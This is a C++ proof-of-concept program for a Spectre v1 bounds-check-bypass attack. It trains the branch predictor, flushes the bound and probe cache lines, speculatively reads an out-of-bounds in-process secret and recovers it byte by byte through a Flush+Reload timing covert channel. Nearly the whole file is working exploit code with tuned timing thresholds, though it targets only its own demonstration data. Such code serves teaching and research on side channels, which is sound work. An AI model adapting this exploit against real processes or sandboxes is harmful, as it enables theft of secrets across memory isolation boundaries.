// Compile: g++ -O{1, 2} main.cpp -o main
// Run: ./main 160 2
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#include <unistd.h>

using u8 = unsigned char;
using u32 = unsigned int;
using u64 = unsigned long long;

// Every data structure touched in the critical path is page aligned to thwart prefetchers.
// This is slightly problematic because 4096 aligned accesses are all going to target
// the same set in L1, so if the secret happens to be more than 8b in an 8-way/32-KiB
// L1D, then we'd lose some characters. But here we're banking on L2 misses rather than
// L1. On Skylake-X, the L2 cache is 16-way associative, 1 MiB in size. The critical
// stride works out to be (1024 KiB << 10) / 16 = 65,536 bytes. We'd select the same L2
// set when accesses are 65,536 bytes apart.
#define PAGE_SZ 0x1000

#define N_COVERT_PAGES 256
alignas(PAGE_SZ) u8 covert[N_COVERT_PAGES * PAGE_SZ];

// Secret key can have any of these characters multiple times.
// Actual value of `secret_space_length` is computed at program entry.
alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
int secret_space_length = 0;

#define ACCESS_BOUND 4
alignas(PAGE_SZ) struct {
    u8 values[ACCESS_BOUND] = {1, 2, 3, 4};     // `get_value` doesn't guard this.
    char secret[128] = "PWND_SECRET";           // `get_value` does (well, should!) guard this.
    volatile u32 NVALUES = ACCESS_BOUND;        // Bound checks must retrieve the bound from memory.
} DATA;

[[gnu::noinline]] u8 get_value(int idx, u8* covert) {
    if (idx < DATA.NVALUES) {
        // Every PAGE_SZ * DATA.values[idx] maps to a unique page in `covert`.
        // Stream prefetchers don't cross page boundaries, so we are guaranteed
        // that accessing PAGE_SZ * 'B' won't accidentally prefetch PAGE_SZ * 'C'.
        // Accesses PAGE_SZ * ord('A'..'Z') touch memory in the range (base + 266'240)
        // to (base + 368'640) where 'base' is the base address of `covert`. This is
        // fine because `covert` spans over 256 distinct pages: from (base + 0) to
        // (base + 1'048'576). Size of `covert` also covers '_' if key includes it.
        return covert[PAGE_SZ * (DATA.values[idx])];
    }
    return 0;
}

// LFENCE pins rdtsc before/after the load so the measured interval actually
// covers the load. Without the fence, nothing stops rdtsc from reordering
// with the load. We don't want that.
inline u32 probe_latency(u8* addr) {
    u64 t0 = __rdtsc();
    _mm_lfence();
    volatile u8 sink = *addr;
    _mm_lfence();
    u64 t1 = __rdtsc();
    return (u32)(t1 - t0);
}

char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, int& sum, int ntry=1) {
    int hits[secret_space_length] = {0};
    int rounds = 1000;
    for (int r = 0; r < rounds; r++) {
        // Train the predictor toward "taken".
        for (int t = 0; t < 1024; t++) {
            sum += get_value(0, covert);
        }

        // Flush the bound and the probe lines.
        _mm_clflush((void*)&DATA.NVALUES);
        for (int i = 0; i < secret_space_length; i++) {
            _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
        }

        // Malicious access. `byte_idx` > 4 is out of bounds. The misprediction
        // speculatively reads `DATA.secret` through the covert channel.
        _mm_lfence();
        sum += get_value(byte_idx, covert);

        for (int n = 0; n < secret_space_length; n++) {
            u8 c = (u8)secret_space[n];
            u32 latency = probe_latency(&covert[PAGE_SZ * c]);
            hits[n] +=  latency < threshold;
        }
    }

    // Hit signals are very low on the tested machine (e.g. 1-2 for 1000 rounds).
    for (int i = 0; i < secret_space_length; i++) {
        if (hits[i] >= hit_threshold) {
            return secret_space[i];
        }
    }
    printf("Byte=%i, Recovery Attempt=%d\n", byte_idx - DATA.NVALUES, ntry + 1);
    if (ntry < 10000) {
        ntry += 1;
        return recover_byte(byte_idx, covert, threshold, hit_threshold, sum, ntry);
    }
    printf("Failed to recover byte at index=%i [threshold=%d, hit_threshold=%d]!\n", byte_idx, threshold, hit_threshold);
    printf("You may try tweaking `threshold` and `hit_threshold` and see if that helps.\n");
    exit(1);
}

int main(int argc, char** argv) {
    u32 threshold = argc > 1 ? atoi(argv[1]) : 180;
    u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
    int secret_length = strlen(DATA.secret);
    secret_space_length = strlen(secret_space);

    // Prefault covert pages. Can't afford TLB misses when probing cache lines.
    for (int i = 0; i < N_COVERT_PAGES; i++) {
        covert[i * PAGE_SZ] = 1;
    }

    // Dummy value to prevent the compiler from eliding `get_value` calls.
    int sum = 0;
    char recovered_secret[secret_length + 1] = {0};
    for (int idx = DATA.NVALUES, k = 0; k < secret_length; idx++, k++) {
        recovered_secret[k] = recover_byte(idx, covert, threshold, hit_threshold, sum);
    }

    printf("\033[92mRecovered secret: %s\033[0m\n", recovered_secret);
    return 0;
}